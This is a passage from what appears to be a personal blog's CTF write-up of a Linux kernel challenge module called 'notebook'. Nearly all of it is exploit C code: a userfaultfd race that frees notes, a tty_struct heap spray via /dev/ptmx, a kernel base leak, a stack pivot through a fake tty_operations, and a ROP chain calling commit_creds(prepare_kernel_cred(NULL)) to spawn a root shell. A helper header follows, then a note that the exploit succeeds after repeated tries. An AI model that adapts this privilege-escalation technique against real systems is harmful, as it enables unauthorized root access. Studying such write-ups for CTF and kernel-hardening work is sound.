class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap executed, mmap address: %p\n\033[m&quot;</span>, mmap_space);</span><br><span class="line">    registerUserFaultFd(mmap_space, <span class="number">0x1000</span>, fault_handler_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap space userfaultfd registered.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        noteadd(i, TTY_STRUCT_SIZE, page);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mNotebook filled.\n\033[m&quot;</span>);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;edit_thread, <span class="literal">NULL</span>, noteedit_exp, (<span class="type">void</span>*)i); <span class="comment">// trigger page fault, freeing all notes</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mCreated 16 paused thread of edit and freeing all notes.\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;edit_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;add_thread, <span class="literal">NULL</span>, noteadd_exp, (<span class="type">void</span>*)i);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;add_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ttyinfo[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ttyinfo, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">    <span class="type">char</span>* hit_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> hit_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>* fake_ttyops_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_ttyops_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">size_t</span>* fake_stack_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_stack_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        read(fd, ttyinfo, i);</span><br><span class="line">        <span class="type">int</span> header = *((<span class="type">int</span>*)ttyinfo);</span><br><span class="line">        <span class="keyword">if</span>(header == <span class="number">0x5401</span> || header ==  <span class="number">0x5402</span>)&#123;</span><br><span class="line">            hit_address = notebook_msg(<span class="literal">false</span>)[i].note;</span><br><span class="line">            hit_idx = i;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_ttyops_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">                fake_ttyops_address = (<span class="type">char</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_ttyops_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                fake_stack_address = (<span class="type">size_t</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_stack_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(hit_address &amp;&amp; fake_stack_address)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(hit_address == <span class="literal">NULL</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to access tty_struct in notes.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fake_stack_address == <span class="literal">NULL</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to find fake stack address.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully accessed tty_struct in note #%d, address: %p\n\033[m&quot;</span>, hit_idx, hit_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully found fake tty_struct_operations in note #%d, address: %p\n\033[m&quot;</span>, fake_ttyops_idx, fake_ttyops_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mSuccessfully found fake stack in note #%d, address: %p\n\033[m&quot;</span>, fake_stack_idx, fake_stack_address);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mReady to get base address of kernel by file_operations ptr.\n\033[m&quot;</span>);</span><br><span class="line">    <span class="type">u_int64_t</span> tty_operation = ((<span class="type">u_int64_t</span>*)ttyinfo)[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mtty_operations address: %p\n\033[m&quot;</span>, (<span class="type">void</span>*)tty_operation);</span><br><span class="line">    <span class="type">u_int64_t</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>((tty_operation &amp; <span class="number">0xFFF</span>) == (ptm_unix98_ops &amp; <span class="number">0xFFF</span>))     <span class="comment">// this file_operations is ptm_unix98_ops</span></span><br><span class="line">        offset = tty_operation - ptm_unix98_ops;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((tty_operation &amp; <span class="number">0xFFF</span>) == (pty_unix98_ops &amp; <span class="number">0xFFF</span>))    <span class="comment">// this file_operations is pty_unix98_ops</span></span><br><span class="line">        offset = tty_operation - pty_unix98_ops;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        errExit(<span class="string">&quot;Unexpected tty_operations address.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mBase address got.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">u_int64_t</span> base_address = kernel_BASE + offset;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)() = (<span class="type">void</span>(*)())(commit_creds_BASE + offset);</span><br><span class="line">    <span class="type">void</span> (*prepare_kernel_cred)() = (<span class="type">void</span>(*)())(prepare_kernel_cred_BASE + offset);</span><br><span class="line">    <span class="type">void</span> (*swapgs_restore_regs_and_return_to_usermode)() = (<span class="type">void</span>(*)())(SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mBase address: %zx.\n\033[m&quot;</span>, base_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mOffset: %zx.\n\033[m&quot;</span>, offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mcommit_creds: %p.\n\033[m&quot;</span>, commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mprepare_kernel_cred: %p.\n\033[m&quot;</span>, prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mswapgs_restore_regs_and_return_to_usermode: %p.\n\033[m&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mReady to trigger the first stack pivoting.\n\033[m&quot;</span>);</span><br><span class="line">    noteedit(fake_ttyops_idx, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations), page);</span><br><span class="line">    noteedit(fake_stack_idx, <span class="number">0x100</span>, page);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> original_tty[TTY_STRUCT_SIZE];</span><br><span class="line">    read(fd, original_tty, hit_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mUnchanged tty_struct content:\n\033[m&quot;</span>);</span><br><span class="line">    print_binary(original_tty, TTY_STRUCT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> fake_tty[TTY_STRUCT_SIZE];</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty, original_tty, TTY_STRUCT_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty_ops[<span class="number">0x200</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_tty_ops, <span class="number">0</span>, <span class="keyword">sizeof</span> fake_tty_ops);</span><br><span class="line">    <span class="type">size_t</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret = <span class="number">0xffffffff81238d50</span>;</span><br><span class="line">    ((<span class="keyword">struct</span> tty_operations*)fake_tty_ops)-&gt;write = (<span class="type">int</span> (*)(<span class="keyword">struct</span> tty_struct *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">int</span>)) (</span><br><span class="line">            push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mfake_tty_operations edited, write pointer: %p\n\033[m&quot;</span>, ((<span class="keyword">struct</span> tty_operations*)fake_tty_ops)-&gt;write);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;35mFirst gadget:\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpush rdi;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpop rsp;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tpop rbp;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tadd rax, rdx;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;\tret;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This gadget is used to migrate rsp to tty_struct in note #%d.\n\033[m&quot;</span>, hit_idx);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rbx_pop_rbp_ret = <span class="number">0xffffffff81002141</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rsp_rbp_pop_rbp_ret = <span class="number">0xffffffff8107875c</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">1</span>] = pop_rbx_pop_rbp_ret + offset;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">3</span>] = (<span class="type">size_t</span>) notebook_msg(<span class="literal">false</span>)[fake_ttyops_idx].note;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty)[<span class="number">4</span>] = mov_rsp_rbp_pop_rbp_ret + offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rbp_ret = <span class="number">0xffffffff81000367</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">1</span>] = pop_rbp_ret + offset;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">2</span>] = (<span class="type">size_t</span>) notebook_msg(<span class="literal">false</span>)[fake_stack_idx].note;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_tty_ops)[<span class="number">3</span>] = mov_rsp_rbp_pop_rbp_ret + offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line">    <span class="type">size_t</span> mov_rdi_rax_pop_rbp_ret = <span class="number">0xffffffff81045833</span>;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x60</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> ropidx = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0xdeadbeefdeadbeef</span>;     <span class="comment">// for pop rbp</span></span><br><span class="line">    rop[ropidx++] = pop_rdi_ret + offset;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)prepare_kernel_cred;    <span class="comment">// prepare_kernel_cred(NULL);</span></span><br><span class="line">    rop[ropidx++] = mov_rdi_rax_pop_rbp_ret + offset;</span><br><span class="line">    rop[ropidx++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)commit_creds;           <span class="comment">// commit_creds(prepare_kernel_cred(NULL));</span></span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)swapgs_restore_regs_and_return_to_usermode + <span class="number">22</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = <span class="number">0</span>;</span><br><span class="line">    rop[ropidx++] = (<span class="type">size_t</span>)&amp;getShell;</span><br><span class="line">    rop[ropidx++] = user_cs;</span><br><span class="line">    rop[ropidx++] = user_rflags;</span><br><span class="line">    rop[ropidx++] = user_sp;</span><br><span class="line">    rop[ropidx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, fake_stack_idx);</span><br><span class="line">    write(fd, fake_tty_ops, fake_ttyops_idx);</span><br><span class="line">    write(fd, fake_tty, hit_idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mEvil data written, ready to exploit....\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        write(ptmx_fds[i], page, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>uffdexploit.h:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m[x] Error: %s\n\033[m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="17.png" alt="" /></p>
<p>成功getshell（有较高的失败率，需要多次尝试）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">142</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
